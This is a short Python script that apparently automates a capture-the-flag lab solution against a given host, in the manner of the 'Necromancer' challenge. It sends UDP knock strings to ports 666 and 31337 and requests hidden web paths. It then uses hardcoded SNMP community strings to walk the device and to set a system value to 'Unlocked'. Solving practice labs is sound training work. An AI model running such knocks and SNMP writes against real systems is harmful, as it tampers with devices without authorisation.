#!/usr/bin/env python

import socket
import urllib2, requests, sys, os

host = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(1.0)
try:
	s.sendto("opensesame\n", (host, 666))
	print(s.recvfrom(1024))

except:
	pass

r = requests.get('http://' + host + '/')
print r.content

r = requests.get('http://' + host + '/amagicbridgeappearsatthechasm/')
print r.content

r = requests.get('http://' + host + '/amagicbridgeappearsatthechasm/talisman')
print r.content

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(1.0)
try:
	s.sendto("blackmagic\n", (host, 31337))
	print(s.recvfrom(1024))

except:
	pass

r = requests.get('http://' + host + '/thenecromancerwillabsorbyoursoul/')
print r.content

r = requests.get('http://' + host + '/thenecromancerwillabsorbyoursoul/necromancer')
print r.content

os.system("snmpwalk -v 2c -c death2all " + host)
os.system("snmpset -v 2c -c death2allrw " + host + " iso.3.6.1.2.1.1.6.0 s \"Unlocked\"")
os.system("snmpwalk -v 2c -c death2all " + host)
